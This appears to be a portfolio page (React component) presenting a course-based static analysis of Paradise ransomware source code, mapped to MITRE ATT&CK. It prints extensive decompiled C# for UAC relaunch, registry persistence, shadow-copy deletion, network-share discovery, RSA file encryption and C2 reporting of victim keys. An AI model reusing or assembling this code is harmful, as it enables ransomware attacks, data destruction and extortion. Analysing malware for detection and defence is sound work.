import { Link } from "react-router-dom";
import CodeBlock from "../CodeBlock";
import CodeRef from "../CodeRef";

export default function ParadiseSourceAnalysis() {
  return (
    <section className="min-h-screen px-6 py-24 max-w-5xl mx-auto text-gray-900">

      {/* Breadcrumb */}
      <div className="text-sm mb-10 font-mono tracking-wide">
        <Link
          to="/#projects"
          className="text-blue-600 hover:text-blue-800 transition"
        >
          ← Back to Projects
        </Link>
      </div>

      {/* Title */}
      <h1 className="text-4xl md:text-5xl font-semibold tracking-tight text-blue-900">
        Paradise Ransomware - Source Code Analysis
      </h1>

      <p className="font-mono text-sm text-blue-700 mt-2 mb-12">
        Ransomware-as-a-Service · C# · RSA · MITRE ATT&CK
      </p>

      <div className="space-y-10 leading-relaxed">

        {/* Overview */}
        <section>
          <h2 className="text-2xl md:text-3xl font-semibold mb-4 text-blue-900">
            Overview
          </h2>

          <p className="text-gray-700 text-lg">
            This analysis focuses exclusively on the Paradise ransomware sourcecode. Paradise is 
            a <CodeRef>Ransomware-as-a-Service (RaaS)</CodeRef> builder that allows affiliates to 
            generate customized ransomwarevariants while relying on a shared cryptographic and execution 
            core.Static analysis of the builder and payload code reveals how Paradise implements 
            encryption, persistence, victim tracking, andattacker-controlled decryption.
          </p>
        </section>


        {/* Code Analysis: Paradise Ransomware */}
        <section>
          <div className="space-y-4 text-gray-700 text-lg">
            {/* Builder Logic + Image */}
            <div className="flex flex-col md:flex-row gap-8 items-start">
              <div className="flex-1 space-y-3">
                <div className="flex items-center gap-2 my-8">
                  <h3 className="font-semibold text-blue-800 whitespace-nowrap">
                    Builder/Configuration Logic
                  </h3>
                  <div className="flex-1 h-px bg-blue-800" />
                </div>
                <p>
                  To demonstrate how <CodeRef>RaaS</CodeRef> operates in practice, the
                  Paradise ransomware builder and core execution logic were statically analyzed.
                  Decompiled code revealed a modular architecture that separates configuration,
                  encryption routines, and post-infection behavior, allowing affiliates to
                  customize each deployment while relying on a shared cryptographic core.
                </p>

                <ul className="space-y-2 pl-4 border-l-2 border-blue-200">
                  <li>
                    <span className="font-mono text-blue-700">RSA_Public</span>: Attacker-defined
                    public key embedded in each build to encrypt the victim's private RSA key.
                  </li>
                  <li>
                    <span className="font-mono text-blue-700">RSA_Private</span>: Retained by the
                    attacker and required to recover the victim's encrypted key material.
                  </li>
                  <li>
                    <span className="font-mono text-blue-700">Server</span>: Configurable
                    command-and-control endpoint used for victim identification and status reporting.
                  </li>
                  <li>
                    <span className="font-mono text-blue-700">Adminkey</span>: Affiliate identifier
                    tying a build to a specific operator or campaign.
                  </li>
                  <li>
                    <span className="font-mono text-blue-700">img / text</span>: Parameters used
                    to generate customized ransom notes per variant.
                  </li>
                </ul>
              </div>
            </div>

            {/* High-level structure + decompiled overview */}
            <div className="flex flex-col md:flex-row gap-8 items-start">
              {/* Folder / module structure */}
              <div className="md:w-1/2 h-[260px] rounded-xl overflow-hidden bg-gray-50">
                <img
                  src="/screenshots/malanalysis/para-folder-struct.png"
                  alt="Paradise ransomware high-level folder and module structure"
                  className="w-full h-full object-cover object-left rounded-xl"
                />
              </div>

              {/* Decompiled overview */}
              <div className="md:w-1/2 h-[260px] rounded-xl overflow-hidden bg-gray-50">
                <img
                  src="/screenshots/malanalysis/paradise-decompile-overview.png"
                  alt="Paradise ransomware decompiled structure"
                  className="w-full h-full object-cover object-left rounded-xl"
                />
              </div>
            </div>

          <div className="flex items-center gap-2 my-8">
            <h3 className="font-semibold text-blue-800 whitespace-nowrap">
              Execution Flow
            </h3>
            <div className="flex-1 h-px bg-blue-800" />
          </div>

             <p>
              Observing the malware's <CodeRef>Main()</CodeRef> function reveals its core structure and execution flow. Given this information,
              we can map its workflow in an intuitive manner. The core functions executed by the malware in order are as follows:
            </p>

            <div className="flex justify-center">
            <div className="w-full max-w-2xl">
              <ol className="space-y-4 text-gray-700 text-base list-none pl-0">

                <li className="flex gap-3">
                  <span className="font-semibold text-blue-800 min-w-[190px]">
                    Stealth & Exec. Control
                  </span>
                  <span className="text-gray-600">
                    Hide console · Infection marker check
                    <span className="ml-2 text-xs text-gray-500 font-mono">
                      T1564.003
                    </span>
                  </span>
                </li>

                <li className="flex gap-3">
                  <span className="font-semibold text-blue-800 min-w-[190px]">
                    Privilege Escalation
                  </span>
                  <span className="text-gray-600">
                    Admin context detection · UAC relaunch
                    <span className="ml-2 text-xs text-gray-500 font-mono">
                      T1548.002
                    </span>
                  </span>
                </li>

                <li className="flex gap-3">
                  <span className="font-semibold text-blue-800 min-w-[190px]">
                    Ransomware Init.
                  </span>
                  <span className="text-gray-600">
                    Key escrow · Persistence · Anti-Recovery
                    <span className="ml-2 text-xs text-gray-500 font-mono">
                      T1547.001, T1547, T1490
                    </span>
                  </span>
                </li>

                <li className="flex gap-3">
                  <span className="font-semibold text-blue-800 min-w-[190px]">
                    Drive & Network Recon
                  </span>
                  <span className="text-gray-600">
                    Mapped drives · Shared folders
                    <span className="ml-2 text-xs text-gray-500 font-mono">
                      T1135, T1046
                    </span>
                  </span>
                </li>

                <li className="flex gap-3">
                  <span className="font-semibold text-blue-800 min-w-[190px]">
                    File Encryption
                  </span>
                  <span className="text-gray-600">
                    RSA block encryption · Partial encryption
                    <span className="ml-2 text-xs text-gray-500 font-mono">
                      T1486
                    </span>
                  </span>
                </li>

                <li className="flex gap-3">
                  <span className="font-semibold text-blue-800 min-w-[190px]">
                    Infection Finalization
                  </span>
                  <span className="text-gray-600">
                    Marker written · Ransom note shown
                    <span className="ml-2 text-xs text-gray-500 font-mono">
                      T1070.004, T1491.001
                    </span>
                  </span>
                </li>

                <li className="flex gap-3">
                  <span className="font-semibold text-blue-800 min-w-[190px]">
                   Key Decryption
                  </span>
                  <span className="text-gray-600">
                    Key Decoding & Decryption
                    <span className="ml-2 text-xs text-gray-500 font-mono">
                      T1140
                    </span>
                  </span>
                </li>

              </ol>

            </div>
          </div>

          <div className="flex items-center gap-2 my-8">
            <h3 className="font-semibold text-blue-800 whitespace-nowrap">
              Stealth & Execution Control
            </h3>
            <div className="flex-1 h-px bg-blue-800" />
          </div>

            <p>
              The first actions taken by the ransomware includes the calling of the <CodeRef>ShowWindow API</CodeRef> to immediately
              hide the console window on execution. Additionally, the malware checks for the presence of 
              the <CodeRef>welldone.dp</CodeRef> file, an artifact created after file encryption, to prevent redundant
              encryption attempts.
            </p>

            {/* Execution control / environment checks */}
            <CodeBlock
  title="Stealth & Execution Control"
  language="csharp"
  code={`//ShowWindow with SW_HIDE to hide console window
var handle = NativeMethods.GetConsoleWindow();
NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);

string appdata = Environment.GetFolderPath(
  Environment.SpecialFolder.ApplicationData
);

// Check for infection marker
if (File.Exists(appdata + "\\\\DP\\\\welldone.dp"))
{
  Process.Start("#DECRYPT MY FILES#.html");
  Environment.Exit(0);
}`}
 />

          <div className="flex items-center gap-2 my-8">
            <h3 className="font-semibold text-blue-800 whitespace-nowrap">
              Privilege Escalation
            </h3>
            <div className="flex-1 h-px bg-blue-800" />
          </div>

            <p>
              Following stealth and execution control, the malware initiates the privilege escalation process.
              First, the malware calls the <CodeRef>isAdmin()</CodeRef> function which checks the current process' privileges using
              the .NET <CodeRef>System.Security.Principal</CodeRef> class.
            </p>

            <p>
              If the current process is not running with administrative privileges, the malware calls the <CodeRef>RunAsAdmin()</CodeRef> function 
              which attempts a user-assisted privilege escalation by re-launching itself with the runas verb 
              which initiates a Windows UAC prompt.
            </p>

          {/* Privilege Escalation: isAdmin + RunAsAdmin */}
          <div className="flex flex-col md:flex-row gap-8 justify-center">

            <CodeBlock
              title="Privilege Check (IsAdmin)"
              language="csharp"
              code={`if (!IsAdmin()) RunAsAdmin();
                
public static bool IsAdmin()
{
  WindowsIdentity id = WindowsIdentity.GetCurrent();
  WindowsPrincipal p = new WindowsPrincipal(id);
  //Checks if current process identity is 
  // Administrator
  return p.IsInRole(WindowsBuiltInRole.Administrator);
}`}
            />

              <CodeBlock
                title="Privilege Escalation (RunAsAdmin)"
                language="csharp"
                code={`public static void RunAsAdmin()
{
  // Relaunches the current process with 'runas' verb to 
  // trigger UAC prompt
  ProcessStartInfo processInfo = new ProcessStartInfo();
  processInfo.Verb = "runas";
  processInfo.FileName = Directory.GetCurrentDirectory() + 
    "\\\\DP_Main.exe";
  try
  {
    Process.Start(processInfo);
  }`}
              />

            </div>

          <div className="flex items-center gap-2 my-8">
            <h3 className="font-semibold text-blue-800 whitespace-nowrap">
              Ransomware Initialization
            </h3>
            <div className="flex-1 h-px bg-blue-800" />
          </div>

            <p>
              During ransomware initialization, the malware performs three core actions: victim-specific key generation and escrow, 
              persistence establishment, and anti-recovery operations. Together, these steps ensure that encrypted data cannot be recovered
              without attacker cooperation and that the malware persists across system reboots.
            </p>

            {/* Ransomware Initialization*/}
            <CodeBlock
  title="Ransomware Initialization"
  language="csharp"
  code={`// Key Generation, Persistence, Anti-Recovery from Main()
if (CheckKeys() == false)
{
CreateKeys(); // Key Generation
MasterRSA.FromXmlString(RSA_MasterPublic);  // Loads attacker's master RSA public key
rsa.FromXmlString(RSA_Public);  //  Loads generated victim public key
SavePrivateKey();   // Encrypts victim's RSA private key using attacker master key for escrow
  while (LockerForValidKey)
  {
  }
  AddToAutorun(); // Registry Persistence
  DeleteShadowCopies(); // Deletion of Shadow Copies
}`} />

            <p>
              To set the stage for the encryption and decryption of files, the ransomware generates a unique RSA key pair specifc to the victim.
              This is acheived by instantiating the <CodeRef>RSACryptoServiceProvider</CodeRef> class. Following the
              generation of the RSA key pair, the keys are serialized into XML objects for storage. The victim's private key is then encrypted using
              the attacker's master RSA public key and stored in the <CodeRef>DecryptionInfo.auth</CodeRef> file.
            </p>

            {/* Key Generation*/}
            <CodeBlock
  title="Key Generation & Escrow"
  language="csharp"
  code={`// RSA key pair generation through RSACryptoServiceProvider
public static RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();

private static void CreateKeys()
{
    // Serialize victim generated keys to XML format
    RSA_Public = rsa.ToXmlString(false);   // Victim public key
    RSA_Private = rsa.ToXmlString(true);   // Victim private key
}

private static void SavePrivateKey()
{
...
    // Encrypt victim private key using attacker's master public key
    string strBytes = "";
    foreach (byte[] bts in master)
    {
      byte[] encrypted = MasterRSA.Encrypt(bts, false);
      strBytes += Encoding.Default.GetString(encrypted);
    }
...
}`} />


          <div className="flex items-center gap-2 my-8 ml-4">
            <h4 className="font-semibold text-blue-700 whitespace-nowrap">
              Persistence
            </h4>
            <div className="flex-1 h-px bg-blue-300" />
          </div>

            <p>
              Following the generation of keypairs, the ransomware proceeds to establish persistence.
              This is acheived by the  <CodeRef>AddToAutorun()</CodeRef> function. 
              This function creates a directory in the AppData folder,
              copies itself to this directory, and creates a registry key in the  <CodeRef>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</CodeRef>.
              This enables the ransomware to run and persist through user logins and reboots.
            </p>

            {/* Persistence: AddToAutorun */}
            <CodeBlock
  title="Peristence (AddToAutorun)"
  language="csharp"
  code={`private static void AddToAutorun()
{
  try
    {
      string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      // Creates \\DP directory in Appdata
      if (!Directory.Exists(appdata + "\\DP")) Directory.CreateDirectory(appdata + "\\DP");
      // Copies Paradise main executable to \\Appdata\\DP\\
      File.Copy(Application.ExecutablePath,appdata+"\\DP\\DP_Main.exe");
      // Creates Registry key under \\CurrentVersion\\Run for execution on startup
      RegistryKey myKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      myKey.SetValue("DP_Main", appdata+"\\\\DP\\\\DP_Main.exe");
      myKey.Close();
    } 
}`} />

          <div className="flex items-center gap-2 my-8 ml-4">
            <h4 className="font-semibold text-blue-700 whitespace-nowrap">
              Anti-Recovery
            </h4>
            <div className="flex-1 h-px bg-blue-300" />
          </div>

            <p>
              To ensure the payment of the ransom, the malware deletes the Volume Shadow Copy Service (VSS) 
              present on the system to prevent the recovery of shadow copies and backup recovery.
              This is accomplished through running the command <CodeRef>sc delete VSS</CodeRef>, which
              removes the Volume Shadow Copy Service from Windows. Additionally hiding the window and redirecting
              standard output for stealth.
            </p>

            {/* Persistence: AddToAutorun */}
            <CodeBlock
  title="Peristence (AddToAutorun)"
  language="csharp"
  code={`private static void DeleteShadowCopies()
{
  try
  {
    // Creates new process configuration that launches the command prompt with a command to delete shadow copies
    ProcessStartInfo psiOpt = new ProcessStartInfo(@"cmd.exe", @"/C sc delete VSS");
    // Ensures command window is hidden
    psiOpt.WindowStyle = ProcessWindowStyle.Hidden;
    // Prevents output from appearing on screen
    psiOpt.RedirectStandardOutput = true;
    psiOpt.UseShellExecute = false;
    psiOpt.CreateNoWindow = true;
    Process procCommand = Process.Start(psiOpt);
    StreamReader srIncoming = procCommand.StandardOutput;
    string resp = srIncoming.ReadToEnd();
    procCommand.WaitForExit();
  }`} />

          <div className="flex items-center gap-2 my-8">
            <h3 className="font-semibold text-blue-800 whitespace-nowrap">
              Drive & Network Reconnaissance
            </h3>
            <div className="flex-1 h-px bg-blue-800" />
          </div>

            <p>
              Occurring after ransomware initialization, the malware performs drive discovery to maximize its encryption surface.
              The <CodeRef>GetDrives()</CodeRef> function enumerates all logical drives on the system and queues them for encryption, deliberately 
              deferring the C:\ drive until last to preserve system stability during execution.
            </p>

            <p className="mt-1 text-sm text-gray-500 italic">
                Note: Although implemented, the <CodeRef>GetNetwork()</CodeRef> function is never invoked from the main execution flow. This suggests 
                that network propagation or encryption of remote shares was either disabled for this build or reserved for other variants.
            </p>

            <p>
              The <CodeRef>GetNetwork()</CodeRef> function presumably called after <CodeRef>GetDrives()</CodeRef>, enumerates
              network hosts, mapped drives, and shared folders. This is acheived through Windows command-line utilities such 
              as <CodeRef>NET USE</CodeRef> and <CodeRef>NET VIEW</CodeRef>.
            </p>


          {/* Drive and Network Recon */}
          <div className="flex flex-col md:flex-row gap-8 justify-center">

            <CodeBlock
              title="Drive Discovery"
              language="csharp"
              code={`private static void GetDrives()
{
  try
  {
    // Stores all drives into an array
    DriveInfo[] allDrives = DriveInfo.GetDrives();
    bool c_contain = false;
    // Enumerates drives on system
    foreach (DriveInfo drive in allDrives)
    {
    // If C:\\ drive, mark for later
      if (drive.Name.Contains("C:\\")) c_contain = true;
      else
      {
        // Else, queue drive
        if(!Drives.Contains(drive.Name))
        {
          Drives.Enqueue(drive.Name);
        }
      }
    }
    // Queues C:\\ drive last
    if (c_contain) Drives.Enqueue("C:\\");
    return;
  }`}
            />

              <CodeBlock
                title="Network Discovery"
                language="csharp"
                code={`private static void GetNetwork()
{
...
// Stores results of shared resources and hosts on current system
string result = DoCMD("NET VIEW " + device);
// Normalize results and split to individual lines
string[] resultList = result.Replace("\\r\\n", "\\n").Split('\\n');
// For each line in list of results
foreach (string line in resultList)
{
    // If line contains string "Disk"
    if (line.Contains("Disk"))
    {
        // Extract the shared folder name
        string folder = BackspacesCleaner(line);
        // Queue the path to the discovered network share
        Drives.Enqueue(device + "\\\\" + folder);
    }
}
...`}
              />

            </div>

          <div className="flex items-center gap-2 my-8">
            <h3 className="font-semibold text-blue-800 whitespace-nowrap">
              File & Folder Encryption
            </h3>
            <div className="flex-1 h-px bg-blue-800" />
          </div>

            <p>
              The <CodeRef>EncryptFile()</CodeRef> function contains the core logic for file encryption. Paradise first filters files based on extensions and file 
              names to ensure that only relevant files are encrypted. Furthermore, files larger than 64 KB are only encrypted at the tail, while files smaller than 
              117 bytes are encrypted in full.
            </p>

            <p>
              It should also be noted that Paradise divides the plaintext into 117-byte blocks and encrypts each block individually. This is required as Paradise 
              utilizes RSA-1024 with PKCS#1 v1.5 padding, this requires a plaintext of 117 bytes, as this padding requires a minimum of 11 bytes per block within 
              the 128-byte RSA modulus.
            </p>

            <p>
              Following the core file encryption operation, files are appended with the encrypted data which has been encoded in base64 and surrounded 
              by <CodeRef>&lt;CRYPTED&gt;</CodeRef> tags. Additionally, the file is renamed to contain the victim's ID, a campaign-defined email, a custom
              extension. Lastly removing the original file.
            </p>

            {/* File Encryption */}
            <CodeBlock
  title="File Encryption"
  language="csharp"
  code={`private static void EncryptFile(string file, RSACryptoServiceProvider ThRSA)
{
  try
    {
      // Selective excludes files containing ransomware artifacts
      FileInfo FN = new FileInfo(file);
      if (FN.Extension != CryptedExtension &amp;&amp; !FN.FullName.Contains("#DECRYPT MY FILES#.html") &amp;&amp; FN.Name != "id.dp" &amp;&amp; FN.Name != "DecryptionInfo.auth" &amp;&amp; FN.Extension != ".dp")
      {
        List&lt;byte[]&gt; partfile = new List&lt;byte[]&gt;(); // Stores chunks of plaintext file data in bytes
        List&lt;byte&gt; lwrt = new List&lt;byte&gt;();         // Stores concatenated RSA-encrypted ciphertext bytes
        if (FN.Length / 1024 &gt; 64)
        {
          partfile = GetPartOfFile(file, 547 * 1);
        }
        else
        {
          int blocks = Convert.ToInt32(FN.Length / 117);
          if (FN.Length &lt; 117)
          {
            partfile.Add(File.ReadAllBytes(file));
            using (var writer = File.OpenWrite(file)) writer.SetLength(0);
          }
          else partfile = GetPartOfFile(file, blocks);
        }
        if (partfile != null)
        {
          foreach (byte[] part in partfile)
          {
            byte[] wrt = ThRSA.Encrypt(part, false);
            lwrt.AddRange(wrt);
          }
          File.AppendAllText(file, "&lt;CRYPTED&gt;" + Convert.ToBase64String(lwrt.ToArray()) + "&lt;/CRYPTED&gt;", Encoding.Default);
          File.Move(file, file + "[id-" + PCID + "].[" + mail + "]"+CryptedExtension);
          File.Delete(file);
        }
      }
    }`} />

            {/* Block Preparation */}
            <div className="flex flex-col md:flex-row gap-8 justify-center">
              <CodeBlock
                title="Block Preparation"
                language="csharp"
                code={`// Splits plaintext into 117-byte chunks
int k = 0;
for (int i = 0; i &lt; blocks_count; i++)
{
  byte[] middle = new byte[117];
  for (int j = 0; j &lt; 117; j++)
  {
    middle[j] = file[k];
    k = k + 1;
  }
  byteFile.Add(middle);
}
return byteFile;`}
              />

          </div>

          <div className="flex items-center gap-2 my-8">
            <h3 className="font-semibold text-blue-800 whitespace-nowrap">
              Infection Finalization & C2 Reporting
            </h3>
            <div className="flex-1 h-px bg-blue-800" />
          </div>

            <p>
              Following the execution of <CodeRef>Handler()</CodeRef> and its encryption process, Paradise enters
              a finalization stage. This is primarily made up of the dropping of ransomware artifacts, as well
              as C2 reporting for victim tracking.
            </p>

            <p>
              Post-encryption, the ransomware documents the time it took to complete the entire encryption process
              in minutes and passes it into the <CodeRef>AddEncryptedPC()</CodeRef> function. Finally dropping
              a marker file and ransom note and exiting.
            </p>

            {/* Infection Finalization */}
            <div className="flex flex-col md:flex-row gap-8 justify-center">
              <CodeBlock
                title="Infection Finalization"
                language="csharp"
                code={`// Stop encryption timer
stopWatch.Stop();
// Convert time to minutes
int minutes = (stopWatch.Elapsed.Hours * 60) + stopWatch.Elapsed.Minutes;
string time = minutes + ":" + stopWatch.Elapsed.Seconds;
// Call C2 reporting function with encryption time and 
AddEncryptedPC(time, CryptedPrivateKey);
// Write marker file indicating finished encryption
File.WriteAllText(appdata+"\\DP\\welldone.dp", "Done");
// Launches ransom note window
Process.Start("#DECRYPT MY FILES#.html");
// End process
Environment.Exit(0);`}
              />

          </div>

          <p>
            The <CodeRef>AddEncryptedPC()</CodeRef> function reports victim metadata and encrypted key material to the
            attacker-controlled C2 endpoint for tracking and payment coordination.
          </p>

            {/* C2 Reporting */}
            <div className="flex flex-col md:flex-row gap-8 justify-center">
              <CodeBlock
                title="C2 Reporting"
                language="csharp"
                code={`private static void AddEncryptedPC(string elapsed_time, string DecryptionInfo)
{
  try
  {
    // Establish C2 endpoint for transmission of victim data
    string url = server + "/api" + "/Encrypted.php";
    using (var webClient = new WebClient())
    {
      // Initialize victim information collection
      var pars = new NameValueCollection();
      // Campaign / build identifier
      pars.Add("v", vector);
      // Total number of encrypted files
      pars.Add("fc", FilesCount.ToString());
      // Victim computer name
      pars.Add("computer_name", Environment.MachineName);
      // Total encryption time
      pars.Add("et", elapsed_time);
      // Encrypted victim private key
      pars.Add("decryption_info", DecryptionInfo);
      // Victim ID
      pars.Add("id", PCID);
      // Transmit victim data to defined C2 via HTTP POST
      var response = webClient.UploadValues(url, pars);
    }
  }`}
              />

          </div>

          <div className="flex items-center gap-2 my-8">
            <h3 className="font-semibold text-blue-800 whitespace-nowrap">
              Key Decryption
            </h3>
            <div className="flex-1 h-px bg-blue-800" />
          </div>

            <p>
             After ransom payment, the attacker decrypts the victim's encrypted private RSA key using their master RSA private key. 
             This decrypted key is then Base64-encoded and returned to the victim, who supplies it to the decryption utility. The <CodeRef>DecryptKey()</CodeRef> function 
             reconstructs and decrypts the key material, enabling file recovery. This process remains fully 
             attacker-controlled, reinforcing the coercive nature of the ransomware.
            </p>

            {/* C2 Reporting */}
            <div className="flex flex-col md:flex-row gap-8 justify-center">
              <CodeBlock
                title="C2 Reporting"
                language="csharp"
                code={`private string DecryptKey(string DecryptionInfo)
{
    // Base64 Decode victim's encoded & encrypted private key
    byte[] privateBytes = Convert.FromBase64String(DecryptionInfo);
    // Calculates number of blocks (1 RSA-1024 block = 128 bytes)
    int iterations = Convert.ToInt32(Math.Ceiling((double)privateBytes.Length / 128));
    List&lt;byte[]&gt; priv = new List&lt;byte[]&gt;();
    int k = 0;
    // Chunk the encrypted private key into 128-byte RSA ciphertext blocks
    for (int i = 0; i &lt; iterations; i++)
    {
        byte[] b = new byte[128];
        for (int j = 0; j &lt; 128; j++)
        {
            if (privateBytes.Length &gt; k)
            {
                b[j] = privateBytes[k];
                k++;
            }
        }
        priv.Add(b);
    }
    string str = "";
    // Instantiate attacker's master RSA private key
    RSACryptoServiceProvider MasterRSA = new RSACryptoServiceProvider();
    MasterRSA.FromXmlString(MasterKey);
    // Initiate block by block decryption of chunked blocks
    foreach (byte[] bts in priv)
    {
        str += Encoding.Default.GetString(MasterRSA.Decrypt(bts, false));
    }
    // Re-encode decrypted victim private key
    return Convert.ToBase64String(Encoding.Default.GetBytes(str));
}`}
              />

          </div>

          </div>
        </section>

        {/* Conclusion */}
        <section>
          <h2 className="text-2xl md:text-3xl font-semibold mb-4 text-blue-900">
            Conclusion
          </h2>

          <p className="text-gray-700 text-lg">
            This project demonstrates a real-life application of Malware Analysis techniques to a 
            ransomware sample observed in the wild. The goal of this project was to apply principles learned in
            CPSC-458 Malware Analysis in order to analyze a sample to identify capabilities of and map them to 
            the MITRE ATT&CK Matrix. This lays the foundation for the eventual remediation and protection against
            malicious software in the future.
          </p>

          <p className="text-gray-700 text-lg mt-4">
            Through static code analysis, this study highlights how modern ransomware operates in practice, 
            from initial execution and persistence to encryption, command-and-control communication, and attacker-controlled decryption. 
            These findings provide a strong foundation for developing effective detection strategies, incident response actions, 
            and long-term defensive protections against similar malware threats.
          </p>


        </section>

      </div>

      <div className="h-20" />
    </section>
  );
}
